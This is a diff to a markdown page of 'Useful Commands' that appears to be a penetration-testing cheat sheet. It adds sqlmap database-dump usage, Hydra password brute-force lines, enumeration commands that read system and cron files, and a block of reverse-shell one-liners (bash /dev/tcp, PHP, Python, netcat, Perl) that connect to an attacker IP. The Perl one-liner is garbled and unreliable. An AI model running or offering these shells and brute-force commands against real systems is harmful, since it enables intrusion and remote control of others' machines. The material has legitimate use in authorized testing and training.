@@ -13,6 +13,7 @@ title: "Useful Commands"
 
 ### Table of Contents
 
+
 * **[Scanning](#scanning)**
     * [Nmap](#nmap)
     * [NetDiscover](#netdiscover)
@@ -31,8 +32,7 @@ title: "Useful Commands"
 
 
 * **[Enumeration/PrivEsc](#enumeration/privesc)**
-    * [LinEnum](#linenum)
-    * [WinPEAS](#winpeas)
+    * [Enum4Linux](#enum4linux)
     * [PowerUp](#powerup)
 
 * **[Cracking](#cracking)**
@@ -59,7 +59,7 @@ export URL="http://10.0.0.1"
 
 ------------------------------
 
-### Scanning 
+## Scanning 
 
 -----------
 #### Nmap
@@ -147,7 +147,6 @@ git clone https://github.com/gcxtx/zoom
 python zoom.py -u <wordpress website>
 
 #Automatic Mode - In automatic mode, Zoom will find subdomains and check those using WordPress for vulnerabilities.
-
 python zoom.py -u <website> --auto
 ```
 
@@ -157,6 +156,166 @@ python zoom.py -u <website> --auto
 nikto -host $URL
 ```
 ------------------
+
+## Gaining access
+-----
+
+#### SQLMap
+
+```bash
+# sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.
+
+#To get a list of basic options and switches use:
+python3 sqlmap.py -h
+
+#To get a list of all options and switches use:
+python sqlmap.py -hh
+
+Examples:
+
+#Burpsuite generated file - In burpsuite intercept tab, you can right click on the request and select "Copy to file" and save the request to a local file. Next you can point SQLMap to that file using the -r parameter:
+
+sqlmap -r request.req --dump --batch
+```
+
+
+#### Hydra
+
+```bash
+  hydra -l user -P passlist.txt ftp://$IP
+  hydra -L userlist.txt -p defaultpw imap://$IP/PLAIN
+  hydra -l admin -p password ftp://$IP
+  hydra -L logins.txt -P pws.txt -M targets.txt ssh
+```
+
+
+
+--------------
+
+## Enumeration/PrivEsc
+
+------------
+
+
+#### Enum4Linux
+
+```sh
+
+Usage: enum4linux [options] $IP
+
+Options can be:
+    -U        get userlist
+    -M        get machine list*
+    -S        get sharelist
+    -P        get password policy information
+    -G        get group and member list
+    -d        be detailed, applies to -U and -S
+```
+
+
+
+#### PowerUp
+
+
+--------------
+## Cracking
+------------
+
+#### Hashcat
+#### John
+#### Stegcracker
+
+--------
+
+## Extra
+
+----------
+
+#### Shells
+
+```sh
+#Reverse shells
+Bash	bash -i >& /dev/tcp/10.0.0.1/9999 0>&1
+PHP	php -r '$sock=fsockopen("10.0.0.1",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
+Python	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+NC v1	nc -e /bin/sh 10.0.0.1 9999
+NC v2	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.1.67 9999 >/tmp/f
+Perl	perl -e 'use Socket;i="10.0.0.1";i="10.0.0.1";p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(p,inet\_aton(p,inet_aton(i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+#Shell Upgrades
+Perl	perl -e 'exec "/bin/bash";'
+Bash	echo os.system('/bin/bash')
+
+#Python3
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+Ctrl + Z
+stty raw -echo; fg
+stty rows 38 columns 116
+
+```
+
+
+
+#### SMB
+
+
+#### FTP
+
+
+#### SUID Commands
+```sh
+find / -user root -perm /4000 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} ; > /tmp/suid
+getcap -r / 2>/dev/null
+```
+
+#### System version
+
+```sh
+cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release
+cat /etc/redhat-release
+```
+
+#### Service settings
+
+```sh
+cat /etc/syslog.conf
+cat /etc/chttp.conf
+cat /etc/lighttpd.conf
+cat /etc/cups/cupsd.conf
+cat /etc/inetd.conf
+cat /etc/apache2/apache2.conf
+cat /etc/my.conf
+cat /etc/httpd/conf/httpd.conf
+cat /opt/lampp/etc/httpd.conf
+ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
+```
+#### Cron jobs
+
+```sh
+crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+```
+
+#### Port forward
+
+```sh
+ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
+ssh -L 8080:127.0.0.1:80 root@10.0.0.1 #Local Port
+ssh -R 8080:127.0.0.1:80 root@10.0.0.1 #Remote Port
+```
+
+
 
 
 ### References
